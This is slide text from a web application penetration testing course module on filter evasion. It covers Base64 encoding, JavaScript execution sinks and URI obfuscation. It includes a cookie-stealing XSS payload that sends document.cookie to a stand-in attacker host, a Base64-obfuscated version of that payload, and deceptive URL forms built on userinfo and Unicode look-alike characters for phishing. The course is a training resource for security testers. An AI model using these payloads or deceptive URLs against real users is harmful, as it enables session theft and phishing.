© Caendra Inc. 2020
All Rights Reserved
Web Application 
Penetration Testing 
eXtreme
/**/
S e c t i o n  0 1  |  M o d u l e  0 2
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Table of Contents
MODULE 02 | /**/
2.1 Base64 Encoding Evasion
2.2 URI Obfuscation Techniques
2.3 JavaScript Obfuscation Techniques
2.4 PHP Obfuscation Techniques
|   p.2
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
We have seen how countermeasures against web 
application attacks can be implemented. Sometimes, they 
are not sufficient and can easily be circumvented. 
There are two solutions: attack vector optimization and 
using obfuscation techniques. The last one has been used 
heavily in web attacks, in the last 10 years.
Introduction & Learning Objectives
|  p.3
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Evading detection techniques is like playing "cops and 
robbers". Security researchers (the robbers), arrange a way 
to evade detection systems. They use the technique for a 
time, but then it becomes public. Next, the cops (the 
defenders) implement a solution to fix the vulnerabilities. 
Now it's time to produce a new technique 
for the robbers!
Introduction & Learning Objectives
|  p.4
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Learning Objectives
In this module, we will cover Evasion techniques > 
Encoding + Obfuscation. 
|   p.5
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
2.1
Base64 Encoding 
Evasion
|  p.6
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
We have seen in the filter section how detection systems 
implement a Regex-based system that searches for 
malicious strings.
Let’s suppose that we want to evade a system that inspects 
JavaScript code for specific keywords like eval, alert, 
prompt, document.cookie, or other potential malicious 
strings. 
2.1 Base64 Encoding Evasion
|  p.7
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
A possible way to escape these kinds of filters is by using 
Base64 encoding. 
Let’s setup an evasion technique for a simple cookie stealer 
payload.
2.1 Base64 Encoding Evasion
|  p.8
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
To steal cookies, not marked as HttpOnly is relatively easy 
and we commonly use this JavaScript payload: 
location.href = 'http://evilpath.com/?c='+escape(document.cookie)
As we mentioned before, a Regex-based filtering system 
may detect the document.cookie keyword and block the 
attack vector.
2.1.1 Cookie Stealer
|  p.9
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Using Base64 encoding, we can hide document.cookie
code translating the attack vector into:
eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGgu
Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=))
As you may have noticed, the eval function may be 
blacklisted; so, let’s see some alternatives to this function.
2.1.1 Cookie Stealer
|  p.10
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
A possible way to parse a string as JavaScript is with the 
following statement: 
[].constructor.constructor("code")()
2.1.1 Cookie Stealer
|  p.11
atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGgu
Y29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=")
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Other valid methods are:
▪
setTimeout("code") #all browsers
▪
setInterval("code") #all browsers
▪
setImmediate("code") #IE 10+
▪
Function("code")() #all browsers
2.1.1 Cookie Stealer
|  p.12
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
2.2
URI Obfuscation 
Techniques
|  p.13
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
URIs are fundamental elements of Internet communications. 
They provide a Uniform (local and remote), Resource Identifier 
and are central in the web navigation system. 
Sometimes, to exploit a vulnerability, you may require a degree of 
social engineering, therefore, making URI obfuscation very useful. 
It can not only be handy in bypassing a filtered system, but also 
to shorten the vector to respect a length limit. Let’s check out 
some techniques to obfuscate URIs.
2.2 URI Obfuscation Techniques
|  p.14
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
URL shortening is a technique in which a URL may be 
shorter in length and still direct to the required page. 
Basically, an HTTP Redirect (301 Moved Permanently) 
header is sent from the domain name that is short to the 
web page that has a long URL.
2.2.1 URL Shortening
|  p.15
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Google URL Shortener
2.2.1 URL Shortening
|  p.16
Long URL
Short URL
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
This technique is suitable for messaging systems where 
character limits are imposed, such as Twitter's 140 chars 
maximum. 
The downside is the abuse for illicit internet activities, such 
as phishing or spamming. 
2.2.1 URL Shortening
|  p.17
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Running your own URL shortener is simple and there are 
multiple services and libraries that allow you to start the 
service easily. For example:
2.2.1 URL Shortening
|  p.18
Payment service
Free and OpenSource
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Since this technique has started to spread as an attack 
vector to send links to malicious resources, some service 
providers have implemented features in order to preview 
where the shortened links point to. 
This is there in order to help users to understand whether 
the link is good or evil. 
2.2.1 URL Shortening
|  p.19
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Bitly.com Short Link Info
For example, bitly.com (bit.ly / j.mp) and managed 
enterprise sites such as amzn.to, on.fb.me, etc. just add a 
plus (+) after a short URL.
2.2.1 URL Shortening
|  p.20
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
2.2.1.1 Bitly.com Short Link Info
|  p.21
The + shows information about the link
bitly.com/hack_me
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Other shortening services implement their technique to 
show the "preview" or some information about the 
shortened link.
The table on the next slide shows some of the most 
common used services.
2.2.1.1 Bitly.com Short Link Info
|  p.22
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020 |  p.23
2.2.1.2 Other Services Short Link Info
Service
How to preview
Tinyurl.com
Preview SUBDOMAIN 
http://preview.tinyurl.com/ph7xh4m
Tiny.cc
Trailing TILDE http://tiny.cc/hack_me~
Other interesting services are analyzed here: 
http://security.thejoshmeister.com/2009/04/how-to-preview-
shortened-urls-tinyurl.html
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
http://t.co/
There are also services that do not provide this feature, 
such as t.co used by Twitter. For this kind of service, online 
solutions like the following exist:
2.2.1.2 Other Services Short Link Info
|  p.24
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
You can have the same result resolving the URLs 'manually’. 
For example, using cURL and reading the response headers:
2.2.1.3 cURL Link Resolver
|  p.25
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
http://tools.ietf.org/html/rfc3986#page-16
We are "used to" viewing URLs in formats like the following:
https://hack.me/s/#n:xss
But RFC 3986 tells us that the these are also valid URLs:
https://hack.me:443
https://_[this_is_valid]PI:EMAIL
2.2.2 URL Hostname Obfuscation
|  p.26
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
http://tools.ietf.org/html/rfc3986#page-16
Starting from the URI structure, what we want to obfuscate 
is the Authority component of a URI:
2.2.2.1 URL Authority Obfuscation
|  p.27
Image taken form RFC 3986
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
The Authority component is structured as follows:
[ userinfo "@" ] host [ ":" port ]
Other than the port subcomponent, we can play with the 
userinfo and host. Let’s look at some examples.
2.2.2.1 URL Authority Obfuscation
|  p.28
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Obfuscating with Userinfo
The userinfo subcomponent is used for authentication. 
If credentials are required to access a resource, they can be 
included here, and the login will be automatic:
http://username:PI:EMAIL/protected_path 
If the page requires NO authentication, the subcomponent 
text is ignored by both browser and server.
2.2.2.1 URL Authority Obfuscation
|  p.29
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
https://hack.me/
Obfuscating with Userinfo – Basic Example
So, if we know that the resource does not require 
authentication, then we could play with this URI 
subcomponent like the following:
https://PI:EMAIL/t/xss
hack.me does not implement this kind of authentication 
and will ignore the www.google.com part (userinfo).
2.2.2.1 URL Authority Obfuscation
|  p.30
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Obfuscating with Userinfo –Example with Unicode
In the userinfo subcomponent, Unicode is allowed, 
therefore, it does not need other additional clarifications.  
See below:
https://✌(◕‿-)✌@hack.me
https://mail.google.com⁄mail⁄u⁄0⁄ʔpli=1＃PI:EMAIL
2.2.2.1 URL Authority Obfuscation
|  p.31
U+2044
FRACTION SLASH
U+0294
LATIN LETTER
GLOTTAL STOP
U+FF03
FULLWIDTH
NUMBER SIGN
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Obfuscating with Userinfo
In contrast, not all browsers support this obfuscation 
technique. Firefox and Opera show alert messages like 
these:
2.2.2.1 URL Authority Obfuscation
|  p.32
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Obfuscating with Userinfo
By default, Internet Explorer versions (after patch 832894) 
do not support userinfo any longer (within URLs with 
schema HTTP or HTTPS). 
Google Chrome and Opera allow this behavior silently!
2.2.2.1 URL Authority Obfuscation
|  p.33
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Obfuscating with Host
Obfuscating the host subcomponent is part of old school 
hacking. There are multiple ways in which a common host name 
can be represented.
Internet names are translated to IP addresses. For example, 
google.com is translated to 173.194.35.23 via Dot-decimal 
notation. But there are also other ways to represent the same 
"number“, such as: Dword, Octal, Hexadecimal.
2.2.2.1 URL Authority Obfuscation
|  p.34
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020